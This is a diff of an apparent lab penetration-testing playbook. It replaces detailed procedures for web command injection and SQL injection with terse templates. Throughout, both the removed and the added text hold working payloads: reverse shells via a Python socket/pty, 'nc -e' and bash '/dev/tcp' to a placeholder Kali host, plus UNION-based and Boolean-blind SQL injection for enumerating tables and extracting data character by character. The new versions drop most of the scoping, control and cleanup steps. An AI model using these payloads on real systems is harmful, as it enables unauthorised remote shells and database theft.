-For example, the delivery retains these fields around the verified carrier:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 --request POST \
-  --data-urlencode "<field>=<ordinary-value>; <absolute-observed-python3> -c 'import os,pty,socket;s=socket.socket();s.connect((\"<kali-lab-interface-ipv4>\",<unused-high-tcp-port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" \
-  --data-urlencode '<required-field>=<captured-value>' \
-  --data-urlencode '<submit-field>=<captured-submit-value>' \
-  --output './command-shell-<same-run-id>/delivery.body' --write-out 'HTTP %{http_code}\n' '<same-observed-endpoint>'
-```
-
-Choose an already observed runtime that can express the reviewed callback; do
-not spend requests bypassing filters when an available Python or other runtime
-already fits. If using WEB-09's private header file, add `--header '@<absolute-private-header-file>'`
-only after checking the same scheme/host/port. Follow no redirects or other origin.
-
-If the reviewed Bash `/dev/tcp` delivery produced no connection through this
-exact carrier, do not call that an execution failure or resend it automatically.
-Only when the target's already observed `nc -h` output explicitly documents
-`-e`, the same unquoted carrier may be used for one separately selected fallback:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>; <absolute-observed-nc> -e /bin/bash <kali-lab-interface-ipv4> <unused-high-tcp-port>; #' \
-  --output './command-shell-<same-run-id>/delivery.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Keep the request's recorded method: a captured form uses the POST shape and its
-required fields. A missing `-e` option, BusyBox/OpenBSD variant, denied route, or
-unknown binary is a retained prerequisite gap, not permission to probe variants.
-
-The HTTP request may wait while the shell runs. Curl timeout does **not** prove
-the remote command stopped and must not trigger another attempt; check the
-listener first. In terminal A's incoming shell, run EXP-03's initial checks
-before broader host enumeration. Do not enumerate the host one HTTP request at
-a time after a usable session exists. Start with:
-
-```bash
-hostname
-id
-whoami
-uname -srm
-pwd
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Commands return and host/account corroborate the assigned target | **EXP-03**, then **LNX-01**. Use **SHELL-01** only if a target PTY is needed. This is application-user access, not automatic root. |
-| Connection arrives but no commands return | Keep it unverified at **PAUSE-COVERAGE**. Do not call a TCP connection a shell. |
-| Curl times out but the attributed shell remains usable | Continue through **EXP-03**; retain the HTTP timeout separately and clean up below when finished. Do not resend. |
-| No connection, Bash/network redirection denied, or request rejected | **PAUSE-COVERAGE** for one exact runtime/route/carrier fact. Stop the listener and check the ordinary control; no automatic retry. |
-| Wrong host/account or a local Kali shell is observed | **EXP-03/PAUSE-ROUTE**. Do not begin target enumeration. |
-| Ordinary request fails or service becomes unhealthy | **PAUSE-RECOVERY** using the lab's known recovery; a crash is not access. |
-
-**Cleanup when leaving this attempt:** type `exit` in the remote shell and confirm
-the owned listener returns to Kali. If it is still waiting, Ctrl-C that exact
-foreground listener. Stop any child/job you started in the session by its own
-recorded method first. A broken connection does not prove the remote process ended;
-unresolved remote state stays at **PAUSE-RECOVERY**, using the known lab reset/recovery.
-
-In terminal B, compare the ordinary control after ending the shell:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './command-shell-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Inspect baseline/control using the original WEXEC-01 comparison. Retain needed
-responses privately, then remove only the named local files:
-
-```bash
-rm -i -- './command-shell-<same-run-id>/baseline.body' './command-shell-<same-run-id>/delivery.body' './command-shell-<same-run-id>/control.body'
-rmdir -- './command-shell-<same-run-id>'
-```
-
-This delivery writes no target payload file or scheduled job. Restore any original
-application side effect separately; normal HTTP output does not prove all remote
-state is clean. Use the source step's cleanup for exact unresolved or intentionally retained resources.
+| Assigned host and identity | **EXP-03**, then **LNX-01**. |
+| Connection, no output | **PAUSE-COVERAGE**. |
+| No connection | **PAUSE-COVERAGE**; stop the listener. |
+| Wrong host | **PAUSE-ROUTE**. |
 
 ## WEXEC-05. Can verified quoted Linux command input provide a usable shell?
 
-Enter only after **WEXEC-02** produced the assembled marker, native `id` and
-Linux OS result, and its ordinary control recovered. Know whether the server
-places the value in a **single-quoted** or **double-quoted** Bash argument. The
-original command and the tail omitted by `#` must be safe. Confirm the exact
-target Bash path and a permitted route to your Kali lab interface. Unknown
-wrapping, stored/blind execution, direct argv and Windows are not this case.
-Use simple field/ordinary values and Bash paths without spaces or shell
-metacharacters. No file is uploaded to the target.
-
-In **Kali terminal A**, verify the lab-facing address and start one foreground
-listener on an unused high port:
+Single-quoted carrier:
 
 ```bash
-ip route get '<authorized-target-ipv4>'
-ncat --listen --verbose --nodns '<kali-lab-interface-ipv4>' '<unused-high-tcp-port>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; <BASH> -c \"exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1\"; #" -o delivery.body '<URL>'
 ```
 
-If binding fails, stop before sending the request. Do not use `--keep-open` or
-a Kali-side command-execution option. Keep terminal A for the incoming channel.
+Double-quoted uses `<field>=<VALUE>"; <BASH> -c "exec ..."; #`. Verify as in WEXEC-04.
 
-In **Kali terminal B**, create one fresh private output directory:
-
-```bash
-mkdir -m 700 -- './quoted-shell-<unique-run-id>'
-```
-
-Confirm the same ordinary GET still works. Use the exact endpoint and identity
-from WEXEC-02. Require curl 8.4+ for this size limit:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './quoted-shell-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-Choose **one** matching delivery, never both. For a server-side **single-quoted**
-argument, the first `'` closes that known argument:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-value>'; <absolute-observed-bash> --noprofile --norc -c \"exec <absolute-observed-bash> --noprofile --norc -i >/dev/tcp/<kali-lab-interface-ipv4>/<unused-high-tcp-port> 2>&1 <&1\"; #" \
-  --output './quoted-shell-<same-run-id>/delivery.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-For a server-side **double-quoted** argument, use this instead. The first `"`
-closes that known argument:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>"; <absolute-observed-bash> --noprofile --norc -c "exec <absolute-observed-bash> --noprofile --norc -i >/dev/tcp/<kali-lab-interface-ipv4>/<unused-high-tcp-port> 2>&1 <&1"; #' \
-  --output './quoted-shell-<same-run-id>/delivery.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-For WEXEC-02's verified ordinary URL-form POST, replace `--get` with
-`--request POST` in the baseline, selected delivery and control requests.
-Preserve every required non-secret field and fresh CSRF value in the captured
-layout. If using WEB-09's private header file, add its header only after
-checking the same scheme, hostname and port. Follow no redirect or other origin.
-
-The HTTP client may time out while the target shell remains active. A curl
-timeout is not permission to resend. In terminal A, test the incoming channel:
-
-```bash
-hostname
-id
-uname -srm
-pwd
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Commands return and host/account corroborate the assigned Linux target | **EXP-03**, then **LNX-01**. This is application-user access, not root. |
-| Connection arrives but no commands return | **PAUSE-COVERAGE** for one channel/identity fact; no verified shell. |
-| Curl times out while an independently attributed shell works | Keep the timeout as a local client result; continue **EXP-03** without resending. |
-| No connection, Bash redirection fails or the request is rejected | Stop the listener; **PAUSE-COVERAGE** for one exact route, parser or carrier fact. Check the ordinary control; no automatic retry. |
-| Wrong host/account or local Kali shell appears | **EXP-03/PAUSE-ROUTE**. Do not begin host work. |
-| Ordinary request fails or service becomes unhealthy | **PAUSE-RECOVERY** using the known lab recovery. A crash is not access. |
-
-**Cleanup when leaving this attempt:** `exit` the remote shell and confirm the
-owned listener returns. If it still waits, Ctrl-C that exact foreground listener.
-Stop any child/job you started by its recorded method first. A broken connection
-does not prove remote termination; retain uncertain state at **PAUSE-RECOVERY**.
-In terminal B, make the final ordinary control after ending the channel:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './quoted-shell-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Compare baseline and control under WEXEC-02's original request context. Retain
-needed responses privately, then remove only the exact local files:
-
-```bash
-rm -i -- './quoted-shell-<same-run-id>/baseline.body' './quoted-shell-<same-run-id>/delivery.body' './quoted-shell-<same-run-id>/control.body'
-rmdir -- './quoted-shell-<same-run-id>'
-```
-
-Restore any original application side effect separately. Use the source step's cleanup for
-any unresolved remote process, local listener or intentionally retained file.
+| Assigned host and identity | **EXP-03**, then **LNX-01**. |
+| No output / no connection | **PAUSE-COVERAGE**. |
+| Wrong host | **PAUSE-ROUTE**. |
 
 # sql_continuation
 
-Run in **Kali Bash** against the confirmed read-only lookup at WEB-06/08. Keep
-its real field, required fields, identity and query context. GET is shown below;
-for an observed ordinary URL-form POST, replace `--get` with `--request POST`
-in each request. Repeat required non-secret fields with `--data-urlencode`.
-An existing WEB-09 session uses its private header file only after manually
-checking the same scheme, hostname and port. No redirects are followed.
-
-Require curl 8.4+. Replace values directly in each command. Names/ordinary values
-in these templates use letters, digits and underscores; other characters or
-shell-expansion syntax use the captured-request editor, not guessed escaping.
-Keep SQL raw, encoded once by curl. Run requests individually, inspect their
-curl exit, HTTP status and result area, and stop on errors, partial output,
-login, 429, changed session/data or instability. HTTP success, reflection and
-body size alone are not SQL proof. Login, writes, stored input, JSON/multipart
-and unknown query positions need their own procedures.
-
-Each task creates a fresh private directory; stop if it exists or creation fails.
-Repeat the same run ID in its commands. Retain needed responses before reusing
-a path. Preserve needed evidence privately and perform the task's exact local cleanup.
-These SELECT procedures create no remote file/process/settings. Secrets and
-target results stay in protected adventure data, never the reusable checklist.
+Enter with a calibrated true/false channel and known quote context.
 
 ## WSQL-02. Does a known single-quoted lookup interpret paired conditions?
 
-Enter only for an evidenced `WHERE field='value'` context with no unresolved
-parentheses/wrapping. The application's final quote closes these literals.
-Check baseline, then true, false and restored ordinary control one at a time:
-
 ```bash
-mkdir -m 700 -- './sql-quoted-<unique-run-id>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './sql-quoted-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-value>' AND '1'='1" \
-  --output './sql-quoted-<same-run-id>/true.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-value>' AND '1'='2" \
-  --output './sql-quoted-<same-run-id>/false.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './sql-quoted-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='1" -o true.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='2" -o false.body '<URL>'
 ```
 
 | Result | Next |
 | --- | --- |
-| Baseline/true/control retain the ordinary record; only false removes it | Record this exact Boolean lead. **WSQL-03** for supported visible SELECT output, or **WSQL-06** for a calibrated Boolean-only scalar question. |
-| Error-only change, rejection or identical results | **WEB-06/WEB-08** for query/request context, or **PAUSE-COVERAGE** for the missing fact. No SQL-wide verdict. |
-| Unstable baseline, identity or transport | **WEB-09/PAUSE-COVERAGE** before interpretation. |
-
-```bash
-rm -i -- './sql-quoted-<same-run-id>/baseline.body' './sql-quoted-<same-run-id>/true.body' './sql-quoted-<same-run-id>/false.body' './sql-quoted-<same-run-id>/control.body'
-rmdir -- './sql-quoted-<same-run-id>'
-```
+| True matches, false differs | **WSQL-03**, or **WSQL-06** without visible output. |
+| No difference | **WEB-06** / **PAUSE-COVERAGE**. |
 
 ## WSQL-03. What UNION width and displayed type actually work?
 
-Enter for supported read-only SELECT injection with visible result fields. Choose
-an observed-valid unused value and verify its empty ordinary result first. These
-examples use a numeric context and a candidate width of **three**, not a default
-for every query. For an evidenced string context, append its closing single quote
-after the unused value in the UNION payloads only; baseline/control keep the
-ordinary value unchanged. Unresolved parentheses/tail syntax stops this branch.
+Write one `NULL` per column; start at the candidate width:
 
 ```bash
-mkdir -m 700 -- './sql-union-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,NULL,NULL -- " -o width.body '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<valid-unused-numeric-value>" \
-  --output './sql-union-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+Replace one `NULL` with `'owb-text'` (text) or `73190+7` (numeric) once the width holds.
 
-Send one chosen width by writing one `NULL` per column, separated by commas:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<valid-unused-numeric-value> UNION ALL SELECT NULL,NULL,NULL -- " \
-  --output './sql-union-<same-run-id>/width.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-A specific column-count error supports choosing another width. Generic 500/blank
-output does not. Use source/count evidence and a chosen finite request budget;
-do not automate a width sweep. Oracle needs its own `FROM DUAL` variant.
-
-With width supported, replace one selected `NULL` by an expression. These
-examples use column two of three. Match the actual verified width/slot.
-Choose one displayed-type probe for the question at hand: use the text example
-when you need a text result, or the arithmetic example when numeric display is
-the unresolved fact. Do not run both type probes by default. If the selected
-type fails, use the other only when the result gives a concrete type/display lead:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<valid-unused-numeric-value> UNION ALL SELECT NULL,73190+7,NULL -- " \
-  --output './sql-union-<same-run-id>/numeric.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<valid-unused-numeric-value> UNION ALL SELECT NULL,'owb-union-text',NULL -- " \
-  --output './sql-union-<same-run-id>/text.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-`73197` must appear in the result field, not reflected request text. Text in a
-real displayed slot supports **WSQL-04**. Numeric-only conversion errors or
-successful NULL with no visible field go to **PAUSE-COVERAGE** for type/renderer
-context; do not claim text extraction. Login/session failures go to **WEB-09**.
-Restore the ordinary value before custody/cleanup:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './sql-union-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-for name in baseline width numeric text control; do
-  file="./sql-union-<same-run-id>/$name.body"
-  if test -f "$file"; then rm -- "$file"; fi
-done
-rmdir -- './sql-union-<same-run-id>'
-```
+| Result | Next |
+| --- | --- |
+| Text appears in a result column | **WSQL-04**. |
+| Column-count error | Retry one other width, then **PAUSE-COVERAGE**. |
+| Conversion error | Try the other type once. |
 
 ## WSQL-04. Which engine/context and one justified row can this slot return?
 
-Enter with verified UNION width, text slot, unused value and closing/comment
-context. The direct request below illustrates a numeric lookup, width three,
-slot two and SQLite. Replace the column layout/query close with recorded facts.
-If the engine, table, column and unique key are already known, skip version,
-database and catalog discovery and run the single row-read command below. If
-one of those facts is missing, ask only the matching context question. Choose
-the engine expression from existing evidence, not a scan of every engine:
+Pick the engine expression:
 
-| Evidenced engine | Version expression | Current database expression |
+| Engine | Version | Database |
 | --- | --- | --- |
 | MySQL/MariaDB | `version()` | `DATABASE()` |
 | PostgreSQL | `version()` | `current_database()` |
 | SQL Server | `@@VERSION` | `DB_NAME()` |
-| SQLite | `sqlite_version()` | No discovery query here; `main` is a declared alias, not a path/login. |
+| SQLite | `sqlite_version()` | `main` |
 
 ```bash
-mkdir -m 700 -- './sql-context-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,sqlite_version(),NULL -- " -o engine.body '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<verified-unused-value> UNION ALL SELECT NULL,sqlite_version(),NULL -- " \
-  --output './sql-context-<same-run-id>/engine.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+Then read one row: `(SELECT <column> FROM <table> WHERE <key>=<ID>)` in the same slot.
 
-Only when the current database is the missing fact, repeat that direct request
-with the matching database expression and `context.body`. NULL may mean no
-current database.
-
-Only when an exact table candidate needs confirmation, substitute its engine's
-scalar expression into the same verified slot and save as `catalog.body`:
-
-| Engine | Exact table question, replacing simple observed names |
+| Result | Next |
 | --- | --- |
-| MySQL/MariaDB | `(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='<table>')` |
-| PostgreSQL | `(SELECT table_name FROM information_schema.tables WHERE table_schema='<schema>' AND table_name='<table>')` |
-| SQL Server | `(SELECT name FROM sys.tables WHERE schema_id=SCHEMA_ID('<schema>') AND name='<table>')` |
-| SQLite | `(SELECT name FROM sqlite_master WHERE type='table' AND name='<table>')` |
+| Engine and value visible | Matching application decision. |
+| Table or key unknown | **WSQL-05**. |
+| Multiple rows or NULL | **PAUSE-COVERAGE**. |
 
-With the actual table, text column and unique numeric key known, and this data
-question authorized, read one scalar. This example still uses width three,
-slot two; use the exact recorded layout, not guessed identifiers:
+## WSQL-05. Which next table or column name is visible in this namespace?
+
+One name per request, cursor starts empty:
 
 ```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<verified-unused-value> UNION ALL SELECT NULL,(SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>),NULL -- " \
-  --output './sql-context-<same-run-id>/read.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>''),NULL -- " -o table.body '<URL>'
+```
+
+For columns: `(SELECT MIN(name) FROM pragma_table_info('<TABLE>') WHERE name>'<CURSOR>')`.
+
+| Result | Next |
+| --- | --- |
+| Table or column name | **WSQL-04** with that name. |
+| NULL | **PAUSE-COVERAGE**; budget exhausted is not absence. |
+
+## WSQL-06. Can one chosen scalar be verified through Boolean-only output?
+
+```bash
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (length((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>))=<N>)" -o length.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (unicode(substr((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>),<POS>,1))=<CODE>)" -o char.body '<URL>'
+python3 -c 'import sys; print(chr(int(sys.argv[1])))' '<CODE>'
 ```
 
 | Result | Next |
 | --- | --- |
-| Attributed engine/context and chosen scalar visible | private adventure evidence, then the changed-context check for a separately authorized next use. Database reading is not OS/account access. |
-| Unknown table/key/rights or NULL | **WSQL-05** for a justified catalog question, or **PAUSE-COVERAGE** for the specific missing fact. No bulk dump. |
-| Multiple-row error, conversion failure or partial body | Refine the known predicate/type at **PAUSE-COVERAGE**; do not hide uncertainty with an arbitrary LIMIT. |
-| Engine contradicts evidence | Recheck source/context before another query. |
-
-Restore the ordinary value, preserve evidence, then remove named responses:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './sql-context-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-for name in engine context catalog read control; do
-  file="./sql-context-<same-run-id>/$name.body"
-  if test -f "$file"; then rm -- "$file"; fi
-done
-rmdir -- './sql-context-<same-run-id>'
-```
-
-## WSQL-05. Which next table or column name is visible in this namespace?
-
-Enter only with verified engine, namespace, width/slot and query close. These
-are metadata questions. Use simple letters/digits/underscore names and a finite
-manual budget, such as five names. The first cursor is an empty SQL string `''`;
-after each actual returned name, replace it by that name for one next request.
-
-| Engine | Next table expression |
-| --- | --- |
-| MySQL/MariaDB | `(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name>'<cursor>')` |
-| PostgreSQL | `(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema='<schema>' AND table_name>'<cursor>')` |
-| SQL Server | `(SELECT MIN(name) FROM sys.tables WHERE schema_id=SCHEMA_ID('<schema>') AND name>'<cursor>')` |
-| SQLite | `(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>'<cursor>')` |
-
-```bash
-mkdir -m 700 -- './sql-catalog-<unique-run-id>'
-```
-
-Direct SQLite example for the first name, width three and slot two. Match the
-verified engine/layout and replace the expression from the table above:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<verified-unused-value> UNION ALL SELECT NULL,(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>''),NULL -- " \
-  --output './sql-catalog-<same-run-id>/table.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-For one observed relevant table, reset the column cursor to `''` and choose:
-
-| Engine | Next column expression |
-| --- | --- |
-| MySQL/MariaDB | `(SELECT MIN(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='<table>' AND column_name>'<cursor>')` |
-| PostgreSQL | `(SELECT MIN(column_name) FROM information_schema.columns WHERE table_schema='<schema>' AND table_name='<table>' AND column_name>'<cursor>')` |
-| SQL Server | `(SELECT MIN(name) FROM sys.columns WHERE object_id=OBJECT_ID('<schema>.<table>') AND name>'<cursor>')` |
-| SQLite 3.16+ | `(SELECT MIN(name) FROM pragma_table_info('<table>') WHERE name>'<cursor>')` |
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<verified-unused-value> UNION ALL SELECT NULL,(SELECT MIN(name) FROM pragma_table_info('<observed-table>') WHERE name>''),NULL -- " \
-  --output './sql-catalog-<same-run-id>/column.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Read names only from the result field. Relevant table/column/key facts route to
-**WSQL-04**. NULL/denial/budget exhaustion remains partial coverage at
-**PAUSE-COVERAGE**, not proof of no objects. Unknown older SQLite, unusual names,
-collation gaps and changing metadata need their own procedure. Only a Boolean
-channel routes to **WSQL-06** for one chosen scalar, not automatic catalog dumping.
-Restore the ordinary lookup before cleanup:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-value>' \
-  --output './sql-catalog-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-for name in table column control; do
-  file="./sql-catalog-<same-run-id>/$name.body"
-  if test -f "$file"; then rm -- "$file"; fi
-done
-rmdir -- './sql-catalog-<same-run-id>'
-```
-
-## WSQL-06. Can one chosen scalar be verified through Boolean-only output?
-
-Enter only with a calibrated, stable read-only channel, verified engine/query
-close and one authorized text scalar that independently returns at most one row.
-Use printable ASCII only and record a finite request/character budget. No timing,
-OAST, automated extraction or login bypass. Calibrate baseline/true/false/restored
-controls with WSQL-01 or WSQL-02 first; retain their actual result discriminator.
-
-The example below uses a verified numeric lookup and SQLite. For a verified
-quoted lookup, use `<ordinary-value>' AND (<predicate>) AND '1'='1` as the whole
-field value. Unknown wrapping syntax stops the procedure.
-
-```bash
-mkdir -m 700 -- './sql-boolean-<unique-run-id>'
-```
-
-Ask whether the chosen scalar is non-NULL before estimating length:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-numeric-id> AND ((SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>) IS NOT NULL)" \
-  --output './sql-boolean-<same-run-id>/nonnull.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
-
-False keeps NULL/no-row uncertain; stop. An error can mean rights, syntax or
-multiple rows. With stable true, select the engine-correct expressions below.
-`<scalar>` means the entire known `(SELECT ... WHERE unique_key=...)` expression,
-repeated directly, not a shell variable:
-
-| Engine | Length | Code at one position |
-| --- | --- | --- |
-| MySQL/MariaDB/PostgreSQL | `CHAR_LENGTH(<scalar>)` | `ASCII(SUBSTRING(<scalar>,<position>,1))` |
-| SQLite | `length(<scalar>)` | `unicode(substr(<scalar>,<position>,1))` |
-| SQL Server | `LEN(CAST(<scalar> AS nvarchar(max))+N'#')-1` | `UNICODE(SUBSTRING(<scalar>,<position>,1))` |
-
-Direct SQLite length-equality request. Choose a nonnegative candidate count:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-numeric-id> AND (length((SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>))=<candidate-length>)" \
-  --output './sql-boolean-<same-run-id>/length.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Select candidates manually. A `>` threshold may narrow the interval, but confirm
-the final equality. Zero is non-NULL empty text; values beyond the budget stay
-partial. For one position inside the confirmed length, check printable ASCII:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-numeric-id> AND (unicode(substr((SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>),<position>,1)) BETWEEN 32 AND 126)" \
-  --output './sql-boolean-<same-run-id>/ascii.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-False means this ASCII procedure does not cover that position. With stable true,
-replace `BETWEEN 32 AND 126` by `>79` for one threshold: true selects 80..126,
-false 32..79. Choose the next midpoint manually within the remaining interval,
-inspect each result, and save as `threshold.body`. No loop.
-
-Confirm the final candidate with equality, then its opposite and ordinary control:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-numeric-id> AND (unicode(substr((SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>),<position>,1))=<final-code>)" \
-  --output './sql-boolean-<same-run-id>/true.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-Compare against the opposite condition:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode "<field>=<ordinary-numeric-id> AND (unicode(substr((SELECT <known-text-column> FROM <known-qualified-table> WHERE <known-unique-key>=<known-numeric-row-id>),<position>,1))<> <final-code>)" \
-  --output './sql-boolean-<same-run-id>/false.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-The equality must be true, opposite false. Repeat the original ordinary lookup
-as `control.body`.
-Only with coherent controls, convert the confirmed code locally:
-
-```bash
-python3 -c 'import sys; n=int(sys.argv[1]); assert 32<=n<=126; print(chr(n))' '<confirmed-code>'
-```
-
-Record confirmed positions privately; select another only within the budget.
-Recheck length/positions if context or data changed. Complete confirmed extent
